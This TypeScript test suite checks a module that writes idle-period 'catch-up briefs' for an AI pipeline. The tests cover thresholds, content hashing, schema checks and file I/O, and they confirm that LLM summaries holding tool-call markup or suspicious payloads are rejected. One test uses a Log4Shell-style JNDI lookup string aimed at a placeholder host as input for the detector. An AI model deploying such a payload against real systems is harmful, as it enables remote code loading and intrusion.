import assert from "node:assert/strict";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, test } from "node:test";

import { canonicalJson } from "./content-hash.js";
import {
  buildDeterministicCatchUpBrief,
  CATCH_UP_BRIEF_DEFAULT_IDLE_THRESHOLD_MS,
  CATCH_UP_BRIEF_DIRECTORY,
  CATCH_UP_BRIEF_MAX_SUMMARY_LENGTH,
  CATCH_UP_BRIEF_SCHEMA_VERSION,
  catchUpBriefFilename,
  composeCatchUpBrief,
  composeDeterministicSummary,
  containsToolCallBlocks,
  isCatchUpBrief,
  readCatchUpBriefs,
  shouldGenerateCatchUpBrief,
  writeCatchUpBrief,
  type CatchUpBrief,
  type CatchUpBriefNoToolsLlmGenerator,
  type CatchUpBriefSourceCounts,
} from "./catch-up-brief.js";

const GENERATED_AT = "2026-05-04T10:32:43.123Z";

const sampleSources = (): CatchUpBriefSourceCounts => ({
  judge_panel: { count: 2, significant: ["tc-1", "tc-2"] },
  gap_finder: { count: 1, significant: ["finding-A"] },
  ir_mutation: { count: 4, significant: ["mut-001", "mut-002"] },
  repair: { count: 3, significant: ["iter-2"] },
  policy: { count: 0, significant: [] },
  evidence: { count: 1, significant: ["seal-ok"] },
});

describe("shouldGenerateCatchUpBrief", () => {
  test("returns true when idle gap exceeds the default threshold", () => {
    const lastInteractionTimeMs = 1_000_000_000;
    const nowMs = lastInteractionTimeMs + CATCH_UP_BRIEF_DEFAULT_IDLE_THRESHOLD_MS + 1;
    assert.equal(
      shouldGenerateCatchUpBrief({ nowMs, lastInteractionTimeMs }),
      true,
    );
  });

  test("returns false when the gap equals the threshold (strictly greater required)", () => {
    const lastInteractionTimeMs = 1_000_000_000;
    const nowMs = lastInteractionTimeMs + CATCH_UP_BRIEF_DEFAULT_IDLE_THRESHOLD_MS;
    assert.equal(
      shouldGenerateCatchUpBrief({ nowMs, lastInteractionTimeMs }),
      false,
    );
  });

  test("honors a custom positive threshold", () => {
    assert.equal(
      shouldGenerateCatchUpBrief({
        nowMs: 1_500,
        lastInteractionTimeMs: 1_000,
        idleThresholdMs: 400,
      }),
      true,
    );
    assert.equal(
      shouldGenerateCatchUpBrief({
        nowMs: 1_300,
        lastInteractionTimeMs: 1_000,
        idleThresholdMs: 400,
      }),
      false,
    );
  });

  test("falls back to the default when threshold is non-positive or non-finite", () => {
    const lastInteractionTimeMs = 1_000_000_000;
    const nowMs = lastInteractionTimeMs + CATCH_UP_BRIEF_DEFAULT_IDLE_THRESHOLD_MS + 1;
    assert.equal(
      shouldGenerateCatchUpBrief({
        nowMs,
        lastInteractionTimeMs,
        idleThresholdMs: 0,
      }),
      true,
    );
    assert.equal(
      shouldGenerateCatchUpBrief({
        nowMs,
        lastInteractionTimeMs,
        idleThresholdMs: Number.NaN,
      }),
      true,
    );
  });

  test("returns false for non-finite timestamps", () => {
    assert.equal(
      shouldGenerateCatchUpBrief({
        nowMs: Number.NaN,
        lastInteractionTimeMs: 1_000,
      }),
      false,
    );
  });
});

describe("composeDeterministicSummary", () => {
  test("emits the empty-window phrasing when no events are present", () => {
    const summary = composeDeterministicSummary({
      sinceMs: 6 * 60_000,
      events: [],
    });
    assert.match(summary, /Idle 6 minutes since last interaction\./);
    assert.match(summary, /No new activity in the idle window\./);
  });

  test("interpolates per-kind counts and significant ids", () => {
    const summary = composeDeterministicSummary({
      sinceMs: 5 * 60_000,
      events: [
        { kind: "judge_panel", count: 2, significant: ["tc-1", "tc-2"] },
        { kind: "gap_finder", count: 1, significant: ["finding-A"] },
      ],
    });
    assert.match(summary, /2 judge-panel verdicts/);
    assert.match(summary, /1 gap-finder finding\b/);
    assert.match(summary, /Notable: judge-panel verdict: tc-1, tc-2/);
  });

  test("clamps to MAX_SUMMARY_LENGTH while preserving terminator", () => {
    const significant = Array.from({ length: 16 }, (_, i) => `id-${"x".repeat(40)}-${i}`);
    const summary = composeDeterministicSummary({
      sinceMs: 5 * 60_000,
      events: [{ kind: "judge_panel", count: 99, significant }],
    });
    assert.ok(
      summary.length <= CATCH_UP_BRIEF_MAX_SUMMARY_LENGTH,
      `summary length ${summary.length} exceeds cap`,
    );
    assert.match(summary, /\.$/);
  });
});

describe("buildDeterministicCatchUpBrief", () => {
  test("produces a schema-valid brief and a sha256 contentHash", () => {
    const brief = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
    });
    assert.equal(brief.schemaVersion, CATCH_UP_BRIEF_SCHEMA_VERSION);
    assert.equal(brief.jobId, "job-1");
    assert.equal(brief.generatorMode, "deterministic");
    assert.match(brief.contentHash, /^[0-9a-f]{64}$/);
    assert.ok(brief.summary.length > 0);
    assert.ok(isCatchUpBrief(brief));
  });

  test("is reproducible: same inputs ⇒ identical contentHash and summary", () => {
    const a = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
    });
    const b = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
    });
    assert.equal(a.summary, b.summary);
    assert.equal(a.contentHash, b.contentHash);
  });

  test("excludes generatedAt from the contentHash", () => {
    const a = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: "2026-05-04T10:32:43.123Z",
    });
    const b = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: "2026-06-01T00:00:00.000Z",
    });
    assert.equal(a.contentHash, b.contentHash);
  });

  test("drops empty groups but preserves significant-only zero-count groups", () => {
    const brief = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: {
        policy: { count: 0, significant: [] },
        repair: { count: 0, significant: ["iter-2"] },
      },
      sinceMs: 60_000,
      generatedAt: GENERATED_AT,
    });
    const kinds = brief.eventsCovered.map((g) => g.kind);
    assert.deepEqual(kinds, ["repair"]);
    assert.deepEqual(brief.eventsCovered[0]?.significant, ["iter-2"]);
  });

  test("rejects invalid jobId / sinceMs / generatedAt", () => {
    assert.throws(() =>
      buildDeterministicCatchUpBrief({
        jobId: "",
        sources: {},
        sinceMs: 0,
        generatedAt: GENERATED_AT,
      }),
    );
    assert.throws(() =>
      buildDeterministicCatchUpBrief({
        jobId: "job-1",
        sources: {},
        sinceMs: -1,
        generatedAt: GENERATED_AT,
      }),
    );
    assert.throws(() =>
      buildDeterministicCatchUpBrief({
        jobId: "job-1",
        sources: {},
        sinceMs: 0,
        generatedAt: "not-iso",
      }),
    );
  });
});

describe("containsToolCallBlocks", () => {
  test("flags Anthropic tool_use JSON blocks", () => {
    assert.equal(
      containsToolCallBlocks(`{"type":"tool_use","name":"foo"}`),
      true,
    );
    assert.equal(
      containsToolCallBlocks(`{"type" : "tool_use" }`),
      true,
    );
    assert.equal(
      containsToolCallBlocks(`{"tool_use_id":"abc"}`),
      true,
    );
  });

  test("flags Anthropic XML markup", () => {
    assert.equal(
      containsToolCallBlocks(`<function_calls><invoke name="x"></invoke></function_calls>`),
      true,
    );
    assert.equal(
      containsToolCallBlocks(`<tool_use>foo</tool_use>`),
      true,
    );
  });

  test("flags OpenAI-style shapes", () => {
    assert.equal(
      containsToolCallBlocks(`"tool_calls": [ ... ]`),
      true,
    );
    assert.equal(
      containsToolCallBlocks(`"function_call": { "name": "foo" }`),
      true,
    );
  });

  test("does not flag plain prose", () => {
    assert.equal(
      containsToolCallBlocks(
        "Reviewer: 3 judge-panel verdicts and 1 gap-finder finding remain pending.",
      ),
      false,
    );
  });
});

describe("composeCatchUpBrief — no_tools_llm rejection path (AT-040)", () => {
  test("returns no_tools_llm brief when generator emits a clean summary", async () => {
    const generator: CatchUpBriefNoToolsLlmGenerator = () => ({
      ok: true,
      summary: "Idle 5 minutes; 2 judge-panel verdicts pending review.",
    });
    const result = await composeCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
      mode: "no_tools_llm",
      noToolsLlmGenerator: generator,
    });
    assert.equal(result.brief.generatorMode, "no_tools_llm");
    assert.equal(result.noToolsLlmFallback, undefined);
    assert.equal(
      result.brief.summary,
      "Idle 5 minutes; 2 judge-panel verdicts pending review.",
    );
  });

  test("falls back to deterministic when summary contains tool_use JSON", async () => {
    const generator: CatchUpBriefNoToolsLlmGenerator = () => ({
      ok: true,
      summary: `Reviewer attention required. {"type":"tool_use","name":"web_search"}`,
    });
    const result = await composeCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
      mode: "no_tools_llm",
      noToolsLlmGenerator: generator,
    });
    assert.equal(result.brief.generatorMode, "deterministic");
    assert.equal(
      result.noToolsLlmFallback?.code,
      "no_tools_llm_tool_call_blocks_present",
    );
  });

  test("falls back when summary contains Anthropic XML invocation markup", async () => {
    const generator: CatchUpBriefNoToolsLlmGenerator = () => ({
      ok: true,
      summary: `Plan: <function_calls><invoke name="run_tool"></invoke></function_calls>`,
    });
    const result = await composeCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
      mode: "no_tools_llm",
      noToolsLlmGenerator: generator,
    });
    assert.equal(result.brief.generatorMode, "deterministic");
    assert.equal(
      result.noToolsLlmFallback?.code,
      "no_tools_llm_tool_call_blocks_present",
    );
  });

  test("falls back when summary contains suspicious payloads (defense-in-depth)", async () => {
    const generator: CatchUpBriefNoToolsLlmGenerator = () => ({
      ok: true,
      summary: `Reviewer attention. \${jndi:ldap://x.example/a}`,
    });
    const result = await composeCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
      mode: "no_tools_llm",
      noToolsLlmGenerator: generator,
    });
    assert.equal(result.brief.generatorMode, "deterministic");
    assert.equal(
      result.noToolsLlmFallback?.code,
      "no_tools_llm_suspicious_content",
    );
  });

  test("falls back when summary is empty", async () => {
    const generator: CatchUpBriefNoToolsLlmGenerator = () => ({
      ok: true,
      summary: "    ",
    });
    const result = await composeCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
      mode: "no_tools_llm",
      noToolsLlmGenerator: generator,
    });
    assert.equal(result.brief.generatorMode, "deterministic");
    assert.equal(
      result.noToolsLlmFallback?.code,
      "no_tools_llm_summary_empty",
    );
  });

  test("falls back when summary exceeds the length cap", async () => {
    const long = `${"a".repeat(CATCH_UP_BRIEF_MAX_SUMMARY_LENGTH + 5)}.`;
    const generator: CatchUpBriefNoToolsLlmGenerator = () => ({
      ok: true,
      summary: long,
    });
    const result = await composeCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
      mode: "no_tools_llm",
      noToolsLlmGenerator: generator,
    });
    assert.equal(result.brief.generatorMode, "deterministic");
    assert.equal(
      result.noToolsLlmFallback?.code,
      "no_tools_llm_summary_too_long",
    );
  });

  test("falls back when generator throws", async () => {
    const generator: CatchUpBriefNoToolsLlmGenerator = () => {
      throw new Error("gateway timeout");
    };
    const result = await composeCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
      mode: "no_tools_llm",
      noToolsLlmGenerator: generator,
    });
    assert.equal(result.brief.generatorMode, "deterministic");
    assert.equal(
      result.noToolsLlmFallback?.code,
      "no_tools_llm_generator_error",
    );
    assert.equal(result.noToolsLlmFallback?.detail, "gateway timeout");
  });

  test("falls back when generator returns a structured refusal", async () => {
    const generator: CatchUpBriefNoToolsLlmGenerator = () => ({
      ok: false,
      code: "no_tools_llm_summary_empty",
    });
    const result = await composeCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
      mode: "no_tools_llm",
      noToolsLlmGenerator: generator,
    });
    assert.equal(result.brief.generatorMode, "deterministic");
    assert.equal(
      result.noToolsLlmFallback?.code,
      "no_tools_llm_generator_refused",
    );
  });

  test("falls back when no_tools_llm requested without a generator", async () => {
    const result = await composeCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
      mode: "no_tools_llm",
    });
    assert.equal(result.brief.generatorMode, "deterministic");
    assert.equal(
      result.noToolsLlmFallback?.code,
      "no_tools_llm_generator_error",
    );
  });

  test("deterministic mode never invokes the generator", async () => {
    let called = false;
    const generator: CatchUpBriefNoToolsLlmGenerator = () => {
      called = true;
      return { ok: true, summary: "should not run" };
    };
    const result = await composeCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
      mode: "deterministic",
      noToolsLlmGenerator: generator,
    });
    assert.equal(called, false);
    assert.equal(result.brief.generatorMode, "deterministic");
    assert.equal(result.noToolsLlmFallback, undefined);
  });
});

describe("isCatchUpBrief", () => {
  test("rejects non-records and bad shapes", () => {
    assert.equal(isCatchUpBrief(null), false);
    assert.equal(isCatchUpBrief(undefined), false);
    assert.equal(isCatchUpBrief("x"), false);
    assert.equal(isCatchUpBrief({}), false);
    assert.equal(isCatchUpBrief({ schemaVersion: "0.0.0" }), false);
  });

  test("rejects oversized summary", () => {
    const valid = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 60_000,
      generatedAt: GENERATED_AT,
    });
    const tooLong = {
      ...valid,
      summary: "x".repeat(CATCH_UP_BRIEF_MAX_SUMMARY_LENGTH + 1),
    };
    assert.equal(isCatchUpBrief(tooLong), false);
  });

  test("accepts a freshly built brief", () => {
    const brief = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 60_000,
      generatedAt: GENERATED_AT,
    });
    assert.equal(isCatchUpBrief(brief), true);
  });
});

describe("catchUpBriefFilename", () => {
  test("produces a filesystem-safe name from an ISO timestamp", () => {
    assert.equal(
      catchUpBriefFilename("2026-05-04T10:32:43.123Z"),
      "2026-05-04T10-32-43-123Z.json",
    );
  });

  test("rejects non-ISO inputs", () => {
    assert.throws(() => catchUpBriefFilename("not-iso"));
  });
});

describe("writeCatchUpBrief / readCatchUpBriefs", () => {
  let workDir: string;

  beforeEach(async () => {
    workDir = await mkdtemp(join(tmpdir(), "catch-up-brief-"));
  });

  afterEach(async () => {
    await rm(workDir, { recursive: true, force: true });
  });

  test("atomic-writes a brief and a subsequent read returns it byte-stable", async () => {
    const brief = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: GENERATED_AT,
    });
    const { artifactPath, serialized } = await writeCatchUpBrief({
      runDir: workDir,
      brief,
    });
    assert.ok(artifactPath.includes(`/${CATCH_UP_BRIEF_DIRECTORY}/`));
    assert.equal(serialized, `${canonicalJson(brief)}\n`);

    const onDisk = await readFile(artifactPath, "utf8");
    assert.equal(onDisk, serialized);

    const result = await readCatchUpBriefs({ runDir: workDir });
    assert.equal(result.parseErrors.length, 0);
    assert.equal(result.briefs.length, 1);
    assert.deepEqual(result.briefs[0], brief);
  });

  test("returns chronological order across multiple briefs", async () => {
    const briefA = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: "2026-05-04T10:00:00.000Z",
    });
    const briefB = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 5 * 60_000,
      generatedAt: "2026-05-04T10:30:00.000Z",
    });
    await writeCatchUpBrief({ runDir: workDir, brief: briefB });
    await writeCatchUpBrief({ runDir: workDir, brief: briefA });
    const { briefs } = await readCatchUpBriefs({ runDir: workDir });
    assert.deepEqual(
      briefs.map((b) => b.generatedAt),
      ["2026-05-04T10:00:00.000Z", "2026-05-04T10:30:00.000Z"],
    );
  });

  test("returns empty result when the briefs/ directory does not exist", async () => {
    const result = await readCatchUpBriefs({ runDir: workDir });
    assert.deepEqual(result, { briefs: [], parseErrors: [] });
  });

  test("surfaces parse errors instead of throwing on malformed JSON", async () => {
    const briefsDir = join(workDir, CATCH_UP_BRIEF_DIRECTORY);
    const { mkdir } = await import("node:fs/promises");
    await mkdir(briefsDir, { recursive: true });
    await writeFile(join(briefsDir, "bad.json"), "{not valid json", "utf8");
    const result = await readCatchUpBriefs({ runDir: workDir });
    assert.equal(result.briefs.length, 0);
    assert.equal(result.parseErrors.length, 1);
    assert.equal(result.parseErrors[0]?.reason, "invalid_json");
    assert.equal(result.parseErrors[0]?.filename, "bad.json");
  });

  test("surfaces schema mismatches without losing good briefs", async () => {
    const brief = buildDeterministicCatchUpBrief({
      jobId: "job-1",
      sources: sampleSources(),
      sinceMs: 60_000,
      generatedAt: GENERATED_AT,
    });
    await writeCatchUpBrief({ runDir: workDir, brief });

    const briefsDir = join(workDir, CATCH_UP_BRIEF_DIRECTORY);
    await writeFile(
      join(briefsDir, "2026-05-04T11-00-00-000Z.json"),
      JSON.stringify({ schemaVersion: "9.9.9", jobId: "x" }),
      "utf8",
    );

    const result = await readCatchUpBriefs({ runDir: workDir });
    assert.equal(result.briefs.length, 1);
    assert.equal(result.parseErrors.length, 1);
    assert.equal(result.parseErrors[0]?.reason, "schema_mismatch");
  });

  test("refuses to persist a malformed brief", async () => {
    const broken = { schemaVersion: "1.0.0", jobId: "x" } as unknown as CatchUpBrief;
    await assert.rejects(
      writeCatchUpBrief({ runDir: workDir, brief: broken }),
      /failed schema validation/,
    );
  });
});
